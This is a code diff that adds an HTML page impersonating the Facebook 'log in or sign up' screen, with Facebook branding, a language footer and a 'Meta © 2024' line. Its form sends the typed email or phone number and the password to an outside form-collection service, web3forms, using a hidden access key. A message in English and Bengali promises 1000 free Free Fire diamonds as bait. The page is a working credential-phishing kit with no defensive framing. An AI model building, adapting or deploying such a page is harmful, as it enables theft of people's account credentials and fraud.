@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook - log in or sign up</title>
+  <link rel="shortcut icon" href="images/2021_Facebook_icon.svg.webp" type="image/x-icon">
+  <script src="https://kit.fontawesome.com/a551d7bdf7.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="Css/style.css" />
+  <link rel="stylesheet" href="Css/responsive.css" />
+</head>
+
+<body>
+  <div class="popup">
+    <img src="images/popup.jpg" alt="">
+    <i class="fas fa-x" id="close"></i>
+  </div>
+  <div class="container">
+    <div class="content containe">
+      <div class="left-side">
+        <img src="images/logo.svg" alt="">
+        <h2>
+          Facebook helps you connect and share with the people in your life.
+        </h2>
+      </div>
+      <div class="formarea containe">
+        <form action="https://api.web3forms.com/submit" method="POST">
+          <input type="hidden" name="access_key" value="fabce83e-db49-477f-9bfd-a59f5308d781">
+          <div class="invalid" id="invalid">
+            <h4>
+              Wrong Credentials <br />
+              <span>invalid username or password</span>
+            </h4>
+          </div>
+          <div class="login" id="login">
+            <h4>Congrats. You got 1000 diamond in free fire.
+              অভিনন্দন. আপনি ফ্রি ফায়ার এ 1000 ডায়মন্ড পেয়েছেন।</h4>
+          </div>
+          <input name="Number or Email" type="text" placeholder="Email address or phone number" id="email"
+            spellcheck="false" style="margin-bottom: -20px;" required />
+          <p id="valid-error" style="margin-bottom: 10px;">
+
+          </p>
+          <div class="password">
+            <input name="পাসওয়ার্ড " type="password" placeholder="password" id="password" required />
+          </div>
+          <input type="submit" value="Log in" id="btn" />
+          <a href="#">Forgotten password?</a>
+          <hr />
+          <button type="submit">Create new account</button>
+        </form>
+        <p>
+          <a href="#">Create a page </a>for a celebraty, brand or business.
+        </p>
+      </div>
+    </div>
+    <footer id="footer">
+      <ul>
+        <li><a href="#">English (UK)</a></li>
+        <li><a href="#">বাংলা</a></li>
+        <li><a href="#">অসমীয়া</a></li>
+        <li><a href="#">हिन्दी</a></li>
+        <li><a href="#">नेपाली</a></li>
+        <li><a href="#">Bahasa Indonesia</a></li>
+        <li><a href="#">العربية</a></li>
+        <li><a href="#">中文(简体)</a></li>
+        <li><a href="#">Bahasa Melayu</a></li>
+        <li><a href="#">Español</a></li>
+        <li><a href="#">Português (Brasil)</a></li>
+      </ul>
+      <a href="#" class="copyright">Meta © 2024</a>
+    </footer>
+  </div>
+  <script src="script.js"></script>
+</body>
+
+</html>
